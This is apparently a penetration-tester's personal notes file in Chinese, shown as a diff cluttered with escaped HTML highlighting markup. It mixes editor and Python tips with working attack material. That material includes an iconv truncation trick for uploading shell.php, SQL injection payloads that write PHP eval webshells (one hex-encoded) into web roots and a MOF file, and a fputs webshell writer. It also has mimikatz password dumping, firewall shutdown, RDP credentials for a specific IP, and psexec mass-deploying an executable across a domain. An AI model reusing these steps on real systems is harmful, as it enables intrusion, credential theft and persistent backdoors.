-   其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
-   或者用如下代码中hex2asc函数:
-   script 2:
-   &amp;lt;?php
-    
-   function asc2hex($str) {  
-   return &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;.substr(chunk_split(bin2hex($str), 2, &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;),0,-2);  
-   } &lt;span class=&quot;sb&quot;&gt;
-
-    
-&lt;/span&gt;   function hex2asc($str) {  
-   $str = join(&#39;&#39;,explode(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;,$str));  
-   $len = strlen($str);  
-   for ($i=0;$i&amp;lt;$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));  
-   return $data;  
-   }  &lt;span class=&quot;sb&quot;&gt;
-
-
-&lt;/span&gt;   for($k=0;$k&amp;lt;256;$k++)
-   {
-   $a=sprintf(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;%02x&quot;,$k);
-   echo &#39;$k:&#39;.$k.&#39; &#39;;
-   echo &#39;$a:&#39;.$a.&#39; &#39;;
-   echo &#39;hex2asc($a):&#39;.hex2asc($a);
-   $file_name=&quot;shell.php&quot;.hex2asc($a).&quot;1.jpg&quot;;
-   echo &#39;$file_name:&#39;.$file_name.&#39;  &#39;;
-   $file_name=iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name);
-   echo &#39;iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name):&#39;.$file_name.&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
-   }
-   /&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
-   echo hex2asc(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&#39;);
-   &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/
-   ?&amp;gt;
-   相同情况下的python脚本为:
-   def hex_to_asc(ch):
-    return &#39;{:c}&#39;.format(int(float.fromhex(ch)))
-
-   for i in range(256):
-    s = &#39;%02x&#39; % i
-    print &quot;s:&quot;,s,&quot;    &quot;,
-    print &quot;hex_to_asc(s):&quot;,hex_to_asc(s)
-    # print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
-&lt;span class=&quot;p&quot;&gt;55.&lt;/span&gt;htmlspecialchars的作用是把:
-   &amp;amp; (和号) 成为 &amp;amp;
-   &quot; (双引号) 成为 &quot;
-   &#39; (单引号) 成为 &#39;
-   &amp;lt; (小于) 成为 &amp;lt;
-&lt;span class=&quot;gt&quot;&gt;   &amp;gt; (大于) 成为 &amp;gt;   &lt;/span&gt;
-   输出的时候不需要特殊处理 浏览器 会把这些标签还原的
-&lt;span class=&quot;p&quot;&gt;56.&lt;/span&gt;linux命令行下结束firefox进程:
-   ps -aux | grep firefox | awk &#39;{if($11==&quot;firefox&quot;) print $2}&#39;| xargs kill -9
-   pkill firefox
-&lt;span class=&quot;p&quot;&gt;57.&lt;/span&gt;菜刀替代工具:Altman
-   http://www.i0day.com/1725.html
-   https://github.com/keepwn/Altman
-&lt;span class=&quot;p&quot;&gt;58.&lt;/span&gt;Pidgin my irc client on linux http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
-&lt;span class=&quot;p&quot;&gt;59.&lt;/span&gt;dig mx domain(without www)
-&lt;span class=&quot;p&quot;&gt;60.&lt;/span&gt;pwntool:https://www.91ri.org/14382.html
-&lt;span class=&quot;p&quot;&gt;61.&lt;/span&gt;vim以十六进制编辑文件:%!xxd
-       :%!xxd    ---&amp;gt;   :%!xxd -r    ---&amp;gt;    :wq
-       如果失败则用hexedit编辑
-           ctrl+X:save and exit
-   vim对比两个文件:vim -d 1.txt 2.txt
-   vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; write
-&lt;span class=&quot;p&quot;&gt;62.&lt;/span&gt;sublime插件:
-    python pep8 autoformat(python代码自动对齐)ctrl+shift+r
-    JsFormat(javascript代码自动对齐)ctrl+alt+f
-&lt;span class=&quot;p&quot;&gt;63.&lt;/span&gt;linux install node.js&amp;amp;npm   http://www.iteblog.com/archives/1313
-&lt;span class=&quot;p&quot;&gt;64.&lt;/span&gt;html内嵌js:
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-   var a = prompt(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;8f93&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5165&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;4f60&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;7684&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;67&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5427&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5c11&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5e74&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;, &quot;&quot;);
-   var b = &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&quot;;
-   var c = /.+_.+_.+/gi;
-   var d = 0x0;
-   var e = a.substr(0x8, 0x5);
-   if ($.md5(e) == b.replace(/7/ig, ++d).replace(/8/ig, d &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x2)) {
-    var f = a.substr(0x0 / d, 0x7);
-    if (f.substr(0x5, 0x2) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&quot; &amp;amp;&amp;amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&quot;) {
-      r = a.substr(0xd);
-      if (r.charCodeAt(d) - 0x19 == r.charCodeAt(++d) - 0x19 &amp;amp;&amp;amp; r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d)) {
-        var g = String.fromCharCode(0x4f);
-        g = g.toLowerCase() + g.toLowerCase();
-        if (r.substr((++d) &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x3, 0x6) == g.concat(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;79&quot;) &amp;amp;&amp;amp; c.test(a)) {
-          d = String(0x1) + String(a.length)
-        }
-      }
-    }
-   };
-   if (a.substr(0x4, 0x1) != String.fromCharCode(d) || a.substr(0x4, 0x1) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7a&quot;) {
-    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;989d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;518d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;53bb&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&quot;)
-   } else {
-    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;)
-   }
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;65.&lt;/span&gt;安装requirements.txt中要求的环境:pip install -r requirements.txt
-&lt;span class=&quot;p&quot;&gt;66.&lt;/span&gt;python urllib&amp;amp;urllib2:
-    http://www.bkjia.com/Pythonjc/1088462.html  Python中http请求方法库汇总,python请求库汇总
-    http请求异常处理(获取异常请求的返回内容)
-        http://my.oschina.net/duhaizhang/blog/69834
-    (爬虫实现http://blog.csdn.net/pleasecallmewhy/article/details/8925978
-    http://blog.csdn.net/pleasecallmewhy/article/details/8934726)
-    beautifulsoup中文http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
-   0&amp;gt;easyest way
-   import urllib2
-   response = urllib2.urlopen(&#39;http://python.org/&#39;)
-   html = response.read()
-
-   1&amp;gt;without post
-   import urllib2
-   req = urllib2.Request(&#39;http://www.voidspace.org.uk&#39;)
-   response = urllib2.urlopen(req)
-   the_page = response.read()
-
-   2&amp;gt;post:(要加入 header,data,需要使用 Request 对象)
-   import urllib
-   import urllib2
-   url = &#39;http://www.someserver.com/cgi-bin/register.cgi&#39;
-   values = {&#39;name&#39; : &#39;Michael Foord&#39;,
-             &#39;location&#39; : &#39;Northampton&#39;,
-             &#39;language&#39; : &#39;Python&#39; }
-   data = urllib.urlencode(values)
-   req = urllib2.Request(url, data)
-   response = urllib2.urlopen(req)
-   the_page = response.read()
-&lt;span class=&quot;p&quot;&gt;67.&lt;/span&gt;python使用urllib2容易犯的错误:
-　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
-　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
-  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,可以使用自己设置的代理,可以设置代理为空:
-
-  　null_proxy_handler=urllib2.ProxyHandler({})
-  　opener=urllib2.build_opener(null_proxy_handler)
-  　urllib2.install_opener(opener)
-
-  　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
-  　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
-  　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.
-&lt;span class=&quot;p&quot;&gt;68.&lt;/span&gt;python,beautifulsoup中正则匹配中文的错误解决办法:http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
-   python正则表达式:
-       http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
-       python一般默认贪婪模式(也即尽量往长度多的结果匹配),变成非贪婪方法:&lt;span class=&quot;ge&quot;&gt;*?(*&lt;/span&gt;加上?)
-       正则表达式 – 运算符优先级
-            http://wp.huangshiyang.com/regexp&lt;span class=&quot;sb&quot;&gt;
-
-            匹配不包含...
-            http://www.jb51.net/article/52491.htm
-
-            前向界定|后向界定|前向非界定|后向非界定
-            http://blog.csdn.net/smilelance/article/details/6529950
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;69.&lt;/span&gt;python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277
-&lt;span class=&quot;p&quot;&gt;70.&lt;/span&gt;python代码中不能有~符号当作/root目录的习惯,open(&#39;~/something&#39;,&#39;r+&#39;)会出错,os.system(&#39;~/something&#39;)不会,为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
-　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些函数,eg.a=&#39;python /root/%s&#39; % input(),os.system(a)
-&lt;span class=&quot;p&quot;&gt;71.&lt;/span&gt;ida pro中graph功能失败,could not find grapher &#39;qwingraph.exe&#39;.please check GRAPH_VISUALIZER in ida.cfg　　　　　　解决方法http://blog.csdn.net/qysh123/article/details/17590731
-&lt;span class=&quot;p&quot;&gt;72.&lt;/span&gt;sqlmap跑出有如
-   Payload: 8.8.8.8&#39; AND 3588=3588-- RMEo
-   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,
-   比如SQLite,这个时候如果同意忽略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite
-   参数,成功跑出目标SQLite数据库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多跑几次就出来了.
-&lt;span class=&quot;p&quot;&gt;73.&lt;/span&gt;preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo &quot;${@phpinfo()}&quot;;就可以了,不必　echo &quot;{${phpinfo()}}&quot;;
-&lt;span class=&quot;p&quot;&gt;74.&lt;/span&gt;vim配置:
-          https://github.com/xinghuacai/spf13-vim
-          http://blog.csdn.net/namecyf/article/details/7787479
-          https://github.com/Valloric/YouCompleteMe
-          https://github.com/VundleVim/Vundle.vim#about
-   python操作vim
-          http://top.jobbole.com/15078/
-   vim中F5编译运行py文件:1&amp;gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
-                           把function添加在_vimrc的前边,不要放在最后:
-                           function CheckPythonSyntax()
-                               let mp = &amp;amp;makeprg
-                               let ef = &amp;amp;errorformat
-                               let exeFile = expand(&quot;%:t&quot;)
-                               setlocal makeprg=python&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;-u
-                               set efm=%C&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%.%#,%A&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;File&lt;span class=&quot;se&quot;&gt;\ \&quot;&lt;/span&gt;%f&lt;span class=&quot;se&quot;&gt;\&quot;\\&lt;/span&gt;,&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;line&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%l%.%#,%Z%&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%^\ &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;%&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;@=%m
-                               silent make %
-                               copen
-                               let &amp;amp;makeprg     = mp
-                               let &amp;amp;errorformat = ef
-                           endfunctio
-   
-                           然后添加:
-                           map &lt;span class=&quot;nt&quot;&gt;&amp;lt;F5&amp;gt;&lt;/span&gt; :call CheckPythonSyntax()&lt;span class=&quot;nt&quot;&gt;&amp;lt;CR&amp;gt;&lt;/span&gt;
-                         2&amp;gt;在vimrc文件中加nnoremap &lt;span class=&quot;nt&quot;&gt;&amp;lt;buffer&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;F9&amp;gt;&lt;/span&gt; :exec &#39;!python&#39; shellescape(@%, 1)&lt;span class=&quot;nt&quot;&gt;&amp;lt;cr&amp;gt;&lt;/span&gt;(1更好)
-    vim进阶:http://coolshell.cn/articles/5426.html&lt;span class=&quot;sb&quot;&gt;
-
-    my tmux配置:
-        #https://github.com/tmux/tmux     安装最新版本
-        https://github.com/gpakosz/.tmux 安装比较好的配置
-        echo $EDITOR
-        export EDITOR=vim
-        echo $EDITOR
-        http://blog.csdn.net/g1036583997/article/details/50466499    tmux提制模式
-        http://cenalulu.github.io/linux/tmux/
-
-    ubuntu安装Oh-My-Zsh:
-        https://zhuanlan.zhihu.com/p/19556676
-        http://www.jianshu.com/p/9a5c4cb0452d
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;75.&lt;/span&gt;1&amp;gt;dmz+光猫+有线路由+无线路由下的端口映射:
-   2&amp;gt;拓扑图大致为:
-          光猫(192.168.1.1)
-           ｜
-        有线路由
-           ｜        
-        无线路由(192.168.3.1)
-           ｜        
-          内网(192.168.3.x)
-   3&amp;gt;其中光猫含有路由器功能,此处有线路由相当于集线器功能
-   4&amp;gt;如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,此ip值由光猫上的dhcp随机分配)
-   5&amp;gt;wan口和lan口区别:&amp;gt;每个路由器有wan口和lan口,光猫拨号,其wan口ip为internet接口所在ip,一般为动态获取的一个值,其lan口ip为192.168.1.1(此ip可在光猫上人工设置成任意192.168.x.1形式)
-                  　&amp;gt;无线路由的wan口ip为光猫所在局域网的ip段中的ip:192.168.1.4,lan口ip为192.168.3.1(此ip可在无线路由器上人工设置成任意192.168.x.1形式)
-   6&amp;gt;不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
-   7&amp;gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
-&lt;span class=&quot;p&quot;&gt;76.&lt;/span&gt;内网渗透 代理&amp;amp;转发 http://www.heysec.org/archives/115
-&lt;span class=&quot;p&quot;&gt;77.&lt;/span&gt;union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;-- - (路径中用/不用&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;
-   写一句话是select 1,2,3,4,&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&lt;/span&gt;,6 into outfile &#39;c:/ksla/lsd/&#39;-- -　　　　(outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
-   mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
-   udf:http://www.cnblogs.com/qing123/p/4676808.html
-   outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
-   在phpmyadmin中
-   windows系统在phpmyadmin的web后台写文件时写成into dumpfile &#39;c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ww&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ome&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;.php&#39;无法写入时,改成into dumpfie &#39;c:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;www&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;some&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;1.php&#39;
-   SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　&#39;/phpstudy/www/121.txt&#39;    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
-   select unhex(&#39;...&#39;) into dumpfile &#39;c:/inetpub/wwwroot/memberinfo/....php&#39;;-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
-   同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex(&#39;3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E&#39;) into dumpfile &#39;C:/AAWServer/www/php/k82.php&#39;;
-&lt;span class=&quot;p&quot;&gt;78.&lt;/span&gt;有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.
-&lt;span class=&quot;p&quot;&gt;79.&lt;/span&gt;ctrl+shift+p==&amp;gt;install==&amp;gt;package syning,backup sublime settings==&amp;gt;https://github.com/csch0/SublimeText-Package-Syncing
-&lt;span class=&quot;p&quot;&gt;80.&lt;/span&gt;http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
-&lt;span class=&quot;p&quot;&gt;81.&lt;/span&gt;windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
-&lt;span class=&quot;p&quot;&gt;82.&lt;/span&gt;php写shell: cmd=fputs(fopen(&#39;chk.php&#39;,&#39;w&#39;),&#39;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php @eval($_POST[nihao]); ?&amp;gt;&lt;/span&gt;&#39;);
-   其中nihao的位置不能有&#39;&#39;或&quot;&quot;,而且fputs的第二个参数只能用单引号包住
-&lt;span class=&quot;p&quot;&gt;83.&lt;/span&gt;rdesktop -u administrator -p nihao103.240.203.6:3389
-&lt;span class=&quot;p&quot;&gt;84.&lt;/span&gt;到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
-   日期)
-&lt;span class=&quot;p&quot;&gt;85.&lt;/span&gt;windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
-   load  mimikatz
-   mimikatz_command -f sekurlsa::searchPasswords
-    -slave 103.240.203.6 200  202.177.192.16 3389
-    local:-listen 
-&lt;span class=&quot;p&quot;&gt;86.&lt;/span&gt;sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
-&lt;span class=&quot;p&quot;&gt;87.&lt;/span&gt;内网渗透:http://www.pojie567.com/blog/?post=5186
-             http://www.1990day.com/regeorg-proxychains-gold-partner/
-             http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
-             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
-             https://www.91ri.org/tag/neiwang-hacker
-             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
-             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
-             http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator -p k78m90 -c c:&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;av&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;009.exe
-             http://drops.wooyun.org/tips/12021   拿下域控权限
-   快速找出dc:
-            dsquery server(best)
-            nslookup -type=SRV _ldap._tcp.baidu.com
-            netdom query fsmo
-            net group &quot;domain controllers&quot; /domain
-&lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
-&lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyll搭建个人博客:
-        https://www.zhihu.com/question/20223939
-        https://github.com/jacobtomlinson/carte-noire
-        http://www.tuicool.com/articles/RZbEV3
-        https://help.github.com/articles/configuring-jekyll/
-        https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
-        http://jekyllrb.com/docs/github-pages/#project-page-url-structure
-        http://jekyllcn.com/
-        https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
-        http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdown语法
-        http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdown语法
-        http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdown语法
-        https://ruby-china.org/topics/14005                             web中文字体应用指南(i use 文泉驿等宽正黑 )
-        http://platinhom.github.io/2015/06/06/Markdown-note/
-        http://xinghuacai.github.io
-        http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
-        myblog/posts-by-categories.html                                 jekyll archive by categories
-        http://www.ithome.com/html/it/195970.htm                        add music to my pages
-&lt;span class=&quot;p&quot;&gt;90.&lt;/span&gt;kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题
-&lt;span class=&quot;p&quot;&gt;91.&lt;/span&gt;https://ghostbin.com/  :-&amp;gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
-                                                             from:
-                                                             http://drops.wooyun.org/pentesting/15117
-&lt;span class=&quot;p&quot;&gt;92.&lt;/span&gt;kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
